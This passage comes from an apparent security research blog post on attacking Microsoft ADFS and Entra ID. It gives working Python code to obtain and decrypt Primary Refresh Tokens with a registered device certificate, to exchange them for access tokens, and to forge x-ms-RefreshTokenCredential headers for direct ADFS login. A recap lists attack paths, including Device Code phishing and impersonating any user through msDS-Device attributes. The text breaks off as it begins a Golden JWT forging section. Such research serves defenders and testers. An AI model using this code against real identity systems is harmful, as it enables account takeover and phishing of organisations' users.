mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">For our purpose we’ll use a Refresh Token as we already have this from the earlier Device Code authentication flow:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="1bbc" class="pv nx gu nv b bg pw px l py pz">def generate_prt_request(client_id, nonce, device_cert, grant_type, refresh_token=&quot;&quot;, username=&quot;&quot;, password=&quot;&quot;):<br/>    <br/>    header = {<br/>        &quot;alg&quot;: &quot;RS256&quot;,<br/>        &quot;x5c&quot;: generate_x5c(device_cert)<br/>    }<br/>    <br/>    payload = {<br/>        &quot;client_id&quot;: client_id,<br/>        &quot;scope&quot;: &quot;aza openid&quot;,<br/>        &quot;request_nonce&quot;: nonce<br/>        }  <br/>    <br/>    payload[&quot;grant_type&quot;] = &quot;refresh_token&quot;<br/>    payload[&quot;refresh_token&quot;] = refresh_token<br/>    <br/>    token = jwt.encode(payload, private_key, algorithm=&quot;RS256&quot;, headers=header)<br/>    <br/>    return token</span></pre><p id="862a" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">And if everything goes well, we’ll get a PRT in the response:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="70f8" class="pv nx gu nv b bg pw px l py pz">{<br/>    &quot;token_type&quot;: &quot;pop&quot;,<br/>    &quot;refresh_token&quot;: &quot;SlZhQk16OQPrDS_J...&quot;,<br/>    &quot;refresh_token_expires_in&quot;: 1209600,<br/>    &quot;session_key_jwe&quot;: &quot;eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9B...&quot;,<br/>    &quot;id_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJh...&quot;<br/>}</span></pre><p id="3609" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">The <code class="cx ns nt nu nv b">session_key_jwe</code> field is needed for exchanging the PRT for an Access Token, which is in turn encrypted using the <code class="cx ns nt nu nv b">msDS-KeyCredentialLink</code> value which we added earlier during Device Registration.</p><p id="754d" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">To decrypt these values, we can use the <code class="cx ns nt nu nv b">decrypt_jwe_with_transport_key</code> from <a class="af oz" href="https://github.com/dirkjanm/ROADtools/blob/87ffa576160a84b3e3b3e387f01d52bdf4933744/roadlib/roadtools/roadlib/deviceauth.py#L719" rel="noopener ugc nofollow" target="_blank">ROADTools code</a> which looks something like:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="04f9" class="pv nx gu nv b bg pw px l py pz">def decrypt_session_token(encrypted_jwt, encrypted_prt, encryption_key):<br/>    <br/>    parts = encrypted_jwt.split(&quot;.&quot;)<br/>    body = parts[1]<br/>    body = body + &quot;=&quot; * (4 - len(body) % 4)<br/>    <br/>    encrypted_key = base64.urlsafe_b64decode(body+(&#x27;=&#x27;*(len(body)%4)))<br/>    session_token = encryption_key.decrypt(encrypted_key, apadding.OAEP(apadding.MGF1(hashes.SHA1()), hashes.SHA1(), None))<br/>    <br/>    return session_token</span></pre><p id="49e7" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Once we have the PRT and the session key, we then have a few options to use it. The first is the usual PRT to Access Token for a resource. This needs a JWT signed with the session token to be generated:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="7faf" class="pv nx gu nv b bg pw px l py pz">def request_access_token(hostname, client_id, scopes, resource, eprt, signing_key, ctx):<br/>    <br/>    token_url = f&quot;https://{hostname}/adfs/oauth2/token&quot;<br/>    <br/>    header = {<br/>        &quot;alg&quot;: &quot;HS256&quot;,<br/>        &quot;ctx&quot;: base64.b64encode(ctx).decode(&quot;utf-8&quot;),<br/>        &quot;kdf_ver&quot;: 1<br/>    }<br/>    <br/>    body = {<br/>        &quot;scope&quot;: &quot; &quot;.join(scopes),<br/>        &quot;client_id&quot;: client_id,<br/>        &quot;resource&quot;: resource,<br/>        &quot;iat&quot;: datetime.datetime.utcnow(),<br/>        &quot;exp&quot;: datetime.datetime.utcnow() + datetime.timedelta(days=1),<br/>        &quot;grant_type&quot;: &quot;refresh_token&quot;,<br/>        &quot;refresh_token&quot;: eprt<br/>    }<br/>    <br/>    token = jwt.encode(body, signing_key, algorithm=&quot;HS256&quot;, headers=header)<br/><br/>    response = requests.post(token_url, data=&quot;grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&amp;request=&quot; + token, verify=False)</span></pre><p id="90a2" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">The response to this is (exactly like their Entra ID counterparts) encrypted using JWE and need to be decrypted. The code for this already exists in ROADTools <code class="cx ns nt nu nv b">decrypt_auth_response_derivedkey</code> <a class="af oz" href="https://github.com/dirkjanm/ROADtools/blob/87ffa576160a84b3e3b3e387f01d52bdf4933744/roadlib/roadtools/roadlib/auth.py#L949" rel="noopener ugc nofollow" target="_blank">function</a> so we can use this to cobble together:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="e186" class="pv nx gu nv b bg pw px l py pz">def decrypt_prt(prt, signing_key, ctx):<br/>    <br/>    parts = prt.split(&quot;.&quot;)<br/>    <br/>    header, enckey, iv, ciphertext, authtag = prt.split(&#x27;.&#x27;)<br/>    header_decoded = base64.urlsafe_b64decode(header + &#x27;=&#x27; * (4 - len(header) % 4))<br/>    <br/>    jwe_header = json.loads(header_decoded)<br/>    iv = base64.urlsafe_b64decode(iv + &#x27;=&#x27; * (4 - len(iv) % 4))<br/>    ciphertext = base64.urlsafe_b64decode(ciphertext + &#x27;=&#x27; * (4 - len(ciphertext) % 4))<br/>    authtag = base64.urlsafe_b64decode(authtag + &#x27;=&#x27; * (4 - len(authtag) % 4))<br/>    <br/>    if jwe_header[&quot;enc&quot;] == &quot;A256GCM&quot; and len(iv) == 12:<br/>        aesgcm = AESGCM(signing_key)<br/>        depadded_data = aesgcm.decrypt(iv, ciphertext + authtag, header.encode(&quot;utf-8&quot;))<br/>        token = json.loads(depadded_data)<br/>    else:<br/>        cipher = Cipher(algorithms.AES(signing_key), modes.CBC(iv))<br/>        decryptor = cipher.decryptor()<br/>        decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()<br/>        unpadder = padding.PKCS7(128).unpadder()<br/>        depadded_data = unpadder.update(decrypted_data) + unpadder.finalize()<br/>        token = json.loads(depadded_data)<br/>    <br/>    return token</span></pre><p id="d674" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">The second use case is the familiar <code class="cx ns nt nu nv b">x-ms-RefreshTokenCredential</code> header, which can be used to login to ADFS directly (useful for things like accessing <code class="cx ns nt nu nv b">/adfs/ls/idpinitiatedsignon.aspx</code>):</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="6640" class="pv nx gu nv b bg pw px l py pz">def generate_prt_header(hostname, client_id, eprt, signing_key, ctx):<br/>    <br/>    token_url = f&quot;https://{hostname}/adfs/oauth2/token&quot;<br/><br/>    try:<br/>        response = requests.post(token_url, data=&quot;grant_type=srv_challenge&quot;, verify=False)<br/>        nonce = response.json()[&quot;Nonce&quot;]<br/>    except Exception as e:<br/>        print(&quot;Failed to get nonce: &quot; + str(e))<br/>        sys.exit(1)<br/>    <br/>    header = {<br/>        &quot;alg&quot;: &quot;HS256&quot;,<br/>        &quot;ctx&quot;: base64.b64encode(ctx).decode(&quot;utf-8&quot;),<br/>        &quot;kdf_ver&quot;: 1<br/>    }<br/>    <br/>    body = {<br/>        &quot;refresh_token&quot;: eprt,<br/>        &quot;request_nonce&quot;: nonce<br/>    }    <br/><br/>    token = jwt.encode(body, signing_key, algorithm=&quot;HS256&quot;, headers=header)<br/>    <br/>    print(&quot;x-ms-RefreshTokenCredential: {}&quot;.format(token))</span></pre><p id="cbe5" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">If we inject this token to the header of a request to <code class="cx ns nt nu nv b">/adfs/ls/idpinitiatedsignon.aspx</code>, we’ll see that we can be logged in:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb ra"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*XQpZWfCvQhvgHf6gT2eZbg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*XQpZWfCvQhvgHf6gT2eZbg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*XQpZWfCvQhvgHf6gT2eZbg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*XQpZWfCvQhvgHf6gT2eZbg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*XQpZWfCvQhvgHf6gT2eZbg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*XQpZWfCvQhvgHf6gT2eZbg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XQpZWfCvQhvgHf6gT2eZbg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*XQpZWfCvQhvgHf6gT2eZbg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*XQpZWfCvQhvgHf6gT2eZbg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*XQpZWfCvQhvgHf6gT2eZbg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*XQpZWfCvQhvgHf6gT2eZbg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*XQpZWfCvQhvgHf6gT2eZbg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*XQpZWfCvQhvgHf6gT2eZbg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*XQpZWfCvQhvgHf6gT2eZbg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="176" loading="lazy" role="presentation"/></picture></div></div></figure><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div class="pa pb rb"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*AdwNLloTSdRR-S886E1QJg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*AdwNLloTSdRR-S886E1QJg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*AdwNLloTSdRR-S886E1QJg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*AdwNLloTSdRR-S886E1QJg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*AdwNLloTSdRR-S886E1QJg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*AdwNLloTSdRR-S886E1QJg.png 1100w, https://miro.medium.com/v2/resize:fit:1260/format:webp/1*AdwNLloTSdRR-S886E1QJg.png 1260w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 630px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*AdwNLloTSdRR-S886E1QJg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*AdwNLloTSdRR-S886E1QJg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*AdwNLloTSdRR-S886E1QJg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*AdwNLloTSdRR-S886E1QJg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*AdwNLloTSdRR-S886E1QJg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*AdwNLloTSdRR-S886E1QJg.png 1100w, https://miro.medium.com/v2/resize:fit:1260/1*AdwNLloTSdRR-S886E1QJg.png 1260w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 630px"/><img alt="" class="bh mb pn c" width="630" height="350" loading="lazy" role="presentation"/></picture></div></figure><p id="5828" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">To make this all a bit easier when playing around, I’ve created a few Python scripts which can be found at <a class="af oz" href="https://github.com/xpn/adfstoolkit:" rel="noopener ugc nofollow" target="_blank">https://github.com/xpn/adfstoolkit:</a></p><ul class=""><li id="9cc4" class="mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr qg qh qi bk"><code class="cx ns nt nu nv b">register_device.py</code> - Performs DRS registration to create <code class="cx ns nt nu nv b">msDS-Device</code></li><li id="7609" class="mu mv gu mw b mx qj mz na nb qk nd ne nf ql nh ni nj qm nl nm nn qn np nq nr qg qh qi bk"><code class="cx ns nt nu nv b">access_token.py</code> - Requests Access Token from PRT</li><li id="e406" class="mu mv gu mw b mx qj mz na nb qk nd ne nf ql nh ni nj qm nl nm nn qn np nq nr qg qh qi bk"><code class="cx ns nt nu nv b">eprt.py</code> - Generates a new Enterprise PRT</li></ul><h1 id="15be" class="nw nx gu bf ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot bk">Then Along Came Azure Hybrid Join</h1><p id="d771" class="pw-post-body-paragraph mu mv gu mw b mx ou mz na nb ov nd ne nf ow nh ni nj ox nl nm nn oy np nq nr gn bk">So we have all of this DRS functionality.. what happens if the environment we are assessing uses Hybrid Join to Entra ID? In that case, we actually find that DRS turns itself off as we can see in the disassembly of ADFS:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb rc"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*tqlD3TZMfJOdRr9XwBHGqw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*tqlD3TZMfJOdRr9XwBHGqw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*tqlD3TZMfJOdRr9XwBHGqw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*tqlD3TZMfJOdRr9XwBHGqw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*tqlD3TZMfJOdRr9XwBHGqw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*tqlD3TZMfJOdRr9XwBHGqw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tqlD3TZMfJOdRr9XwBHGqw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*tqlD3TZMfJOdRr9XwBHGqw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*tqlD3TZMfJOdRr9XwBHGqw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*tqlD3TZMfJOdRr9XwBHGqw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*tqlD3TZMfJOdRr9XwBHGqw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*tqlD3TZMfJOdRr9XwBHGqw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*tqlD3TZMfJOdRr9XwBHGqw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*tqlD3TZMfJOdRr9XwBHGqw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="340" loading="lazy" role="presentation"/></picture></div></div></figure><p id="e7a2" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">But while this turns off the DRS HTTP services, it still allows Device Authentication. But why? Wouldn’t it makes sense to disable all device registration functionality? Well not quite, as Entra ID still supports ADFS Device Authentication in the form of Device Writeback.</p><h1 id="9715" class="nw nx gu bf ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot bk">Entra Connect Device Writeback</h1><p id="8011" class="pw-post-body-paragraph mu mv gu mw b mx ou mz na nb ov nd ne nf ow nh ni nj ox nl nm nn oy np nq nr gn bk">If Device Writeback has been enabled during the rollout of Entra Connect, <code class="cx ns nt nu nv b">msDS-Device</code> objects are synced with their Entra ID device object counterparts.</p><p id="c6a3" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">In Entra Connect we see the option to enable Device Writeback:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb rd"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Rx8DYwPx4oOt8nAYfBEBLw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Rx8DYwPx4oOt8nAYfBEBLw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Rx8DYwPx4oOt8nAYfBEBLw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Rx8DYwPx4oOt8nAYfBEBLw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Rx8DYwPx4oOt8nAYfBEBLw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Rx8DYwPx4oOt8nAYfBEBLw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Rx8DYwPx4oOt8nAYfBEBLw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*Rx8DYwPx4oOt8nAYfBEBLw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Rx8DYwPx4oOt8nAYfBEBLw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Rx8DYwPx4oOt8nAYfBEBLw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Rx8DYwPx4oOt8nAYfBEBLw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Rx8DYwPx4oOt8nAYfBEBLw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Rx8DYwPx4oOt8nAYfBEBLw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*Rx8DYwPx4oOt8nAYfBEBLw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="285" loading="lazy" role="presentation"/></picture></div></div></figure><p id="8305" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">When a new device is registered in Entra ID, we see that the ID is written to the <code class="cx ns nt nu nv b">CN=RegisteredDevices</code> container exactly the same as our previous DRS registration examples, with the difference that the <code class="cx ns nt nu nv b">MSOL_</code> account will be the owner of the object rather than the ADFS service account:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb re"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*hCFnpEOgBZLEX0pmzR64Ug.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*hCFnpEOgBZLEX0pmzR64Ug.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*hCFnpEOgBZLEX0pmzR64Ug.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*hCFnpEOgBZLEX0pmzR64Ug.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*hCFnpEOgBZLEX0pmzR64Ug.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*hCFnpEOgBZLEX0pmzR64Ug.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hCFnpEOgBZLEX0pmzR64Ug.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*hCFnpEOgBZLEX0pmzR64Ug.png 640w, https://miro.medium.com/v2/resize:fit:720/1*hCFnpEOgBZLEX0pmzR64Ug.png 720w, https://miro.medium.com/v2/resize:fit:750/1*hCFnpEOgBZLEX0pmzR64Ug.png 750w, https://miro.medium.com/v2/resize:fit:786/1*hCFnpEOgBZLEX0pmzR64Ug.png 786w, https://miro.medium.com/v2/resize:fit:828/1*hCFnpEOgBZLEX0pmzR64Ug.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*hCFnpEOgBZLEX0pmzR64Ug.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*hCFnpEOgBZLEX0pmzR64Ug.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="291" loading="lazy" role="presentation"/></picture></div></div></figure><p id="9140" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">And with the many attacks possible against Entra ID, this can provide an avenue to migrate your access to ADFS using the methods outlined in the post.</p><p id="121f" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">So with that said, let’s take a quick recap of the attack paths we’ve passed on the way to this point:</p><ol class=""><li id="a7e0" class="mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr rf qh qi bk">If an organisation has DRS enabled, and doesn’t have Hybrid Join in the Service Connection Point LDAP entry, you can potentially phish using Device Code OAuth2 flow for access to ADFS.</li><li id="0791" class="mu mv gu mw b mx qj mz na nb qk nd ne nf ql nh ni nj qm nl nm nn qn np nq nr rf qh qi bk">If an organisation has DRS enabled, but has enabled Hybrid Join in the Service Connection Point LDAP entry, DRS web services are disabled, but Device Writeback can provide a method of accessing ADFS if a new Entra ID device registration is performed.</li><li id="37f7" class="mu mv gu mw b mx qj mz na nb qk nd ne nf ql nh ni nj qm nl nm nn qn np nq nr rf qh qi bk">Regardless, if ADFS uses OAuth2, Device Code auth is likely enabled, so again, phishing can be used to target other application integrations.</li><li id="b8fa" class="mu mv gu mw b mx qj mz na nb qk nd ne nf ql nh ni nj qm nl nm nn qn np nq nr rf qh qi bk">And if we can control a <code class="cx ns nt nu nv b">msDS-Device</code> and Device Authentication is enabled, we can authenticate to ADFS as any user by modifying <code class="cx ns nt nu nv b">msDS-RegisteredOwner</code> and <code class="cx ns nt nu nv b">msDS-RegisteredUsers</code> and using a device certificate</li></ol><p id="17b2" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Let’s finish things off by looking at the concept of a Golden JWT.</p><h1 id="edcc" class="nw nx gu bf ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot bk">Golden JWT</h1><p id="1d8a" class="pw-post-body-paragraph mu mv gu mw b mx ou mz na nb ov nd ne nf ow nh ni nj ox nl nm nn oy np nq nr gn bk">This is similar to Golden SAML in that if we have the correct signing key, we can forge the appropriate JWT’s for third-party integrations.</p><p id="ba8d" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Let’s use the previous ClaimsXRay lab that we previously setup to target:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb rg"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Qtt9L3Im_suq29IdeAcbtw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Qtt9L3Im_suq29IdeAcbtw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Qtt9L3Im_suq29IdeAcbtw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Qtt9L3Im_suq29IdeAcbtw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Qtt9L3Im_suq29IdeAcbtw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Qtt9L3Im_suq29IdeAcbtw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Qtt9L3Im_suq29IdeAcbtw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*Qtt9L3Im_suq29IdeAcbtw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Qtt9L3Im_suq29IdeAcbtw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Qtt9L3Im_suq29IdeAcbtw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Qtt9L3Im_suq29IdeAcbtw.png 786w, 